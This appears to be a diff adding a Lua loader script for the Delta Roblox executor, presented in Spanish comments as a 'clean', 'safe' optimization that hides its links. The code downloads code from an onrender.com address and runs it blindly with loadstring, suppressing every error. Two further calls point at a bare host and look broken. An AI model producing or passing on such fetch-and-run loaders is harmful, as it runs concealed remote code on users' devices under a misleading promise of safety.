@@ -1,0 +1,21 @@
+--[[ v2.0.0 Delta Mobile Optimized (2026) ]]
+-- Sistema limpio que oculta los enlaces y evita que Delta se congele
+
+local function lanzar(url)
+    task.spawn(function()
+        local exito, resultado = pcall(function()
+            return game:HttpGet(url)
+        end)
+        if exito and resultado then
+            local ejecutable = loadstring(resultado)
+            if ejecutable then
+                pcall(ejecutable)
+            end
+        end
+    end)
+end
+
+-- Aquí cargamos tus scripts de forma segura en la memoria
+lanzar("https://botthepan.onrender.com/script/b3a93984bad302ba")
+lanzar("https://onrender.com")
+lanzar("https://onrender.com")
